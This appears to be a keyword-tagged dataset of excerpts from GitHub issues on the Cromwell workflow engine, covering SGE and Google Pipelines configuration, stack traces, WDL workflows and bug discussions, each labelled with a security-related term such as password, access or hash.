>>>; runtime{; backend:""SGE""; memory:""1 GB""; sge_queue:""test.q -P test -t 1-3""; sge_project:""test""; jobs_name:""${jobname}""; }; output{; String presuccess=""done""; Int rc=read_lines(stdout())[0]; }; }; """"""; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; this my runtime-attributes setting in the reference.conf file. runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? jobs_name; String? sge_queue; String? sge_project; """""". submit = """"""; qsub \; -clear \; -terse \; -N ${job_name} \; -wd ${cwd}/execution \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb +""g,num_proc="" + cpu} \; ${""-q "" + sge_queue} \; -binding ${""linear:"" + cpu} \; ${script} | perl -ne 's/\..*//;print;'; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3805:2297,PASSWORD,PASSWORDS,2297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3805,1,['PASSWORD'],['PASSWORDS']
Security,"re `5: Write access:` we have to stage stuff in CWL too - maybe even more so than we do in WDL. Regardless, my comment would be that we don't necessarily need to write to the same FS that inputs are coming from - eg if we're running on PAPI would could ""write"" to `gs://...` even if most inputs are coming from `https://...`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400828579:13,access,access,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400828579,1,['access'],['access']
Security,re `6: hashes beside CRC32` - yes we *can* use anything. Only if we want to call cache between tasks from different FS's do we need to standardize. That's not been a problem for now between local (`md5`) and GCS (`CRC32C`) because we'd never call cache between local and PAPI anyway,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400829241:7,hash,hashes,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-400829241,1,['hash'],['hashes']
Security,"re of real-time cost monitoring/control (thanks to @TimothyTickle for the suggestion). Monitoring is done using the new ""monitoring action"" for PAPIv2, which currently uses the hard-coded [quay.io/broadinstitute/cromwell-monitor](https://quay.io/repository/broadinstitute/cromwell-monitor) image, built from https://github.com/broadinstitute/cromwell-monitor (I wasn't sure if that code belonged here or in a separate repo). This is advantageous to just using it as a _monitoring_script_, because it removes all assumptions on the ""user"" Docker image (for the task itself). For example, we don't have to assume a particular distribution or presence of Python and its libraries. So it should work exactly the same for any task. Per @geoffjentry's suggestion, we've [consulted](https://groups.google.com/forum/#!topic/google-genomics-discuss/caYM7oHbfx0) with the Google Genomics team, and they don't see any apparent issues with the concept. We could expose this as a workflow option like `monitoring_image`, and allow configuring it at the Cromwell level, so e.g. any user of Terra (or any other hosted Cromwell with PAPIv2 backend) could get usage reports without having to configure anything. The metrics are reported in their GCP project, so a user gets automatic access to them as long as they're a viewer. We could also easily expose a link to workflow- and task-level reports in Job Manager UI, so they will be literally point-and-click away. Each timepoint is designed to be self-sufficient, as it is labeled with:; - Cromwell-specific values, such as workflow ID, task call name, index and attempt.; - GCP instance values such as instance name, zone, number of CPU cores, total memory and disk size. Here's an example graph of cpu/memory/disk utilization for one of our production workflows, as it is running right now - one can already see we could probably save ~40% of the cost:; <img width=""1869"" alt=""screen shot 2019-01-02 at 4 43 20 pm"" src=""https://user-images.githubusercontent.com/13",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510:2213,expose,expose,2213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510,1,['expose'],['expose']
Security,"reTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder r",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4607,validat,validation,4607,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['validat'],['validation']
Security,"receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2144,secur,security,2144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"red(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }; workflow-options {; workflow-log-temporary = false; }; backend {; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; filesystems {; local {; caching {; # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:; duplication-strategy: [; ""soft-link"", ""copy""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # Default: file; hashing-strategy: ""path""; }; }; }; ...; backend.default = SGE; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql://0.0.0.0:40001/testuser_db?useSSL=false&rewriteBatchedStatements=true""; user = ""fake""; password = ""fake""; driver = ""com.mysql.jdbc.Driver""; connectionTimeout = 5000; }; }. system {; # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; lines = 128000000; string = 128000000; json = 128000000; tsv = 128000000; map = 128000000; object = 128000000; }; }. ```. <!-- Paste/Attach your workflow if possible: -->; a modified version of : https://github.com/gatk-workflows/gatk4-data-processing. [workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log](https://github.com/broadinstitute/cromwell/files/2143529/workflow.0263ce1e-e1da-44c4-a49f-56fea7a6e1ea.log). A workflow is failing. It looks like cromwell attempts to localise some folder, ; ```/share/ScratchGeneral/evaben/cromwell/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/0263ce1e-e1da-44c4-a49f-56fea7a6e1ea/call-SamToFastqAndBwaMem/inputs/-21323395/cromwell -> /share/ScratchGeneral/evaben/cromwell```; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3825:1095,password,password,1095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3825,1,['password'],['password']
Security,retrieve hashes from quay.io for the call caching,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2252:9,hash,hashes,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2252,1,['hash'],['hashes']
Security,"right now that's not the default in FC, nor do we expose it in the UI - people have used it and it does help for some circumstances where you need it, but it seems like overkill when all you want is reliable statuses. it also won't help with the aborting issue which is what the gatk post was",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869:50,expose,expose,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869,1,['expose'],['expose']
Security,"right now we authz that a user has access to read/manipulate a workflow, but anyone can submit. how do we whitelist this?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3222:35,access,access,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3222,1,['access'],['access']
Security,"ring? (optional)"",; ""MainWorkflow.value_2_give"": ""String (optional, default = \""default value\"")""; }; ```; This output json shows which variables you can (or must) provide in order to be able to run in this case the main workflow. here we see that we are able to provide values for the Mainworkflow, MainTask and SubWorkflow but not the SubTask.; If we do the same for just the subworkflow:; ```; $ java -jar womtool-84.jar inputs SubWorkflow.wdl; {; ""SubWorkflow.overwrite_value_2_give"": ""String? (optional)"",; ""SubWorkflow.SubTask.overwrite_given_value"": ""String? (optional)"",; ""SubWorkflow.value_2_give"": ""String (optional, default = \""default value\"")""; }; ```; We see that we are able to provide a value for ""overwrite_given_value"" of the SubTask. . I have tried to add the key to this anyway to the MainWorkflow input but womtools won't accept it:; ```; $ cat MainWorkflow_inputs.json; {; ""MainWorkflow.SubWorkflow.SubTask.overwrite_given_value"": ""test""; }; $ java -jar womtool-84.jar validate MainWorkflow.wdl -i MainWorkflow_inputs.json; WARNING: Unexpected input provided: MainWorkflow.SubWorkflow.SubTask.overwrite_given_value (expected inputs: [MainWorkflow.MainTask.overwrite_given_value, MainWorkflow.SubWorkflow.overwrite_value_2_give, MainWorkflow.value_2_give]); ```. **Conclusion**; This let me to the conclusion that it is not possible to provide values for tasks called in subworkflows. I'm not sure if this is a bug or a missing feature but it would really be helpful if it is possible to implement especially given that it is already possible for the main workflows. **Motivation**; I run and develop genomics pipelines that are using WDL+Cromwell with a HPC Slurm back-end. For each task we require variables that tells the back-end how much resources it need in order to complete it. By default these values are calculated or given by the workflow which is calling the task however it can happen that some tasks need a little bit more to complete. As you cannot overwrite varia",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6841:2745,validat,validate,2745,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6841,1,['validat'],['validate']
Security,"ring] phenolist = paaaa.phenotype_out; }; }; task paaaa {; input{; String phenotype; File annotation; }; command <<<; set -eux; >>>; output {; File plots = phenotype + ""_plot.pdf""; String phenotype_out = phenotype; }; }; ```; The difference between the two being different task names, ""aaaa"" and ""paaaa"", respectively. Note that both of the workflows have an input named ""phenolist"", and an output named ""phenolist"". ; When running `womtool-85.jar inputs working.wdl`, the results are; ```json; {; ""gwas_validation.phenolist"": ""File"",; ""gwas_validation.aaaa.annotation"": ""File""; }; ```; As they should. For the failing workflow, the results are; ```; {; ""gwas_validation.phenolist"": ""File""; }; ```; As you can see, the input ""gwas_validation.paaaa.annotation"": ""File"" has been dropped.; womtool and cromwell-84 (not tested on cromwell-85) also drop all outputs from the outputs, returning only ""{}"".; The task also fails on cromwell, since cromwell does not recognize that there should be any other inputs than ""gwas_validation.phenolist"", and raises an error on that. ; Please note that this is a minified example. renaming variables, erasing variables, adding variables etc can change the failing example to working and vice versa. Based on the behaviour of the examples, I suspect this is related to building the workflow graph somehow. I have included the workflows as well as their womgraphs as files in this issue. [fail.graph.txt](https://github.com/broadinstitute/cromwell/files/11033034/fail.graph.txt); [fail.wdl.txt](https://github.com/broadinstitute/cromwell/files/11033035/fail.wdl.txt); [work.graph.txt](https://github.com/broadinstitute/cromwell/files/11033036/work.graph.txt); [work.wdl.txt](https://github.com/broadinstitute/cromwell/files/11033037/work.wdl.txt); <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ## Configuration:; Latest womtool-85.jar, downloaded from releases OR; cromwell-84.jar OR; womtool-84.jar",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7096:3335,PASSWORD,PASSWORDS,3335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7096,1,['PASSWORD'],['PASSWORDS']
Security,"rivate-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""us-central1"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. # Con",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:3510,access,access,3510,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['access'],['access']
Security,"rkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); cromwell_1 | 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); cromwell_1 | 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); cromwell_1 | ; cromwell_1 | 2024-01-11 11:09:38 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - BT-322 0845428a:myworkflow.mytask:-1:1 is not eligible for call caching; ```; <!-- Which backend are you running? -->; Used backend: ; GCPBATCH. Callcaching works with PAPIv2, not on GCPBATCH.; <!-- Paste/Attach your workflow if possible: -->; workflow used for testing:; ```; workflow myworkflow {; call mytask; }. task mytask {; String str = ""!""; command <<<; echo ""hello world ${str}""; >>>; output {; String out = read_string(stdout()); }. runtime{; docker: ""eu.gcr.io/project/image_name:tag""; cpu: ""1""; memory: ""500 MB""; disks: ""local-disk 5 HDD""; zones: ""europe-west1-b europe-west1-c europe-west1-d""; preemptible: 2; noAddress: true; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; We are using cromwell through broadinstitute/cromwell:87-ecd44b6 image.; cromwell configuration:; ```; include required(classpath(""application"")). system.new-workflow-poll-rate=1. // increase timeout for http requests..... getting meta-data can timeout for large workflows.; akka.http.server.request-timeout=600s. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; system {; 	job-rate-control {; 	 jobs = 100; 	 per = 1 second; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:7128,PASSWORD,PASSWORDS,7128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['PASSWORD'],['PASSWORDS']
Security,"rkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2020-08-21 11:08:59,66] [info] WorkflowManagerActor WorkflowActor-dbd5cdc0-c79a-42cd-b929-56ddb1115467 is in a terminal state: WorkflowFailedState; [2020-08-21 11:09:00,66] [info] Not triggering log of token queue status. Effective log interval = None; ```. Here is the relevant part of the wdl:. ```; backend {; default = PAPIv2; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory""; config {; concurrent-job-limit = 10000; max-concurrent-workflows = 10000; genomics-api-queries-per-100-seconds = 10000; maximum-polling-interval = 300; max-workflow-launch-count = 2000; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; }; filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; sra {; class = ""cromwell.filesystems.sra.SraPathBuilderFactory""; docker-image = ""fusera/fusera:alpine""; ngc = ""didnt want to put this up online""; }; }; }; }; }; }; ```. I ran this with cromwell 52. Any suggestions would be appreciated",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793:3414,access,access,3414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793,1,['access'],['access']
Security,"rkflow.scala:63),List())WorkflowFailure(wdl.WdlWorkflow.childGraphNodesSorted(WdlWorkflow.scala:63),List())WorkflowFailure(wdl.WdlGraphNode$.buildWomGraph(WdlGraphNode.scala:140),List())WorkflowFailure(wdl.WdlWorkflow$.womWorkflowDefinition(WdlWorkflow.scala:52),List())WorkflowFailure(wdl.WdlWorkflow.womDefinition$lzycompute(WdlWorkflow.scala:73),List())WorkflowFailure(wdl.WdlWorkflow.womDefinition(WdlWorkflow.scala:73),List())WorkflowFailure(wdl.WdlInputParsing$.buildWomExecutable(WdlInputParsing.scala:27),List())WorkflowFailure(wdl.WdlNamespaceWithWorkflow.womExecutable(WdlNamespace.scala:97),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$15(MaterializeWorkflowDescriptorActor.scala:493),List())WorkflowFailure(scala.util.Either.flatMap(Either.scala:338),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$13(MaterializeWorkflowDescriptorActor.scala:491),List())WorkflowFailure(scala.util.Either.flatMap(Either.scala:338),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:157),List())WorkflowFailure(scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:304),List())WorkflowFailure(scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37),List())WorkflowFailure(scala.concurrent.impl.CallbackRunnable.run(Promise.sca",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3176:1592,validat,validateWdlNamespace,1592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3176,1,['validat'],['validateWdlNamespace']
Security,"rks fine but the second is not starting because the output of the first task cannot be 'linked' or 'copied'. This cause the workflow to fail. The interesting part is that in the input folder of the second task there are two subfolders: 1 is empty named as `13016223` and the other is not accessible `-1976550098`. The workflow to run needs installed:; `cutadapt` and the script named `moveBarcodeToID.pl` that can be downloaded from here:. https://drive.google.com/open?id=1AizxTwjOEhL5XA7rsx-wbY97p0duB1nw. input fastq files can be retrieved here (they are small ~10000 reads each):. https://drive.google.com/file/d/1-c14Tja4zY3lyr6icFWT06stznR_-Zqr/view?usp=sharing; https://drive.google.com/file/d/1oJd_U9MjTllL0_kpNivw8I_LtSyvqpXH/view?usp=sharing. How can I solve this issue and make the workflow running smoothly?. ### Which backend are you running? ; I am running locally the workflow for now (because I am in the first phase of the development). ### Workflow is this:; ```; #workflow validated before running with: wdltool validate example.wdl and womtool validate scMeth_v2.wdl.sh -i scMeth_input_3.json. workflow scMeth {; # information for trimming the cell barcode; File command; Int bases; File input_fastq1; File input_fastq2; String sampleName. # information for trimming the adapters and low quality reads; File file_format; Int low_quality_cutoff; Int read_length_cutoff; String adapters_1; String adapters_2; Int trim_start_R1; Int trim_end_R1; Int trim_start_R2; Int trim_end_R2; String TAG; call trimCellBarcode {; input:; sampleName=sampleName,; bases=bases,; input_fastq1=input_fastq1,; input_fastq2=input_fastq2,; command=command; }; call trimAdapters {; input:; file_format=file_format,; input_r1 = trimCellBarcode.fastq_debarcoded_R1,; input_r2 = trimCellBarcode.fastq_debarcoded_R2,; low_quality_cutoff=low_quality_cutoff,; read_length_cutoff=read_length_cutoff,; adapters_1=adapters_1,; adapters_2=adapters_2,; trim_start_R1=trim_start_R1,; trim_end_R1=trim_end_R1,; trim_st",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:1191,validat,validated,1191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,2,['validat'],"['validate', 'validated']"
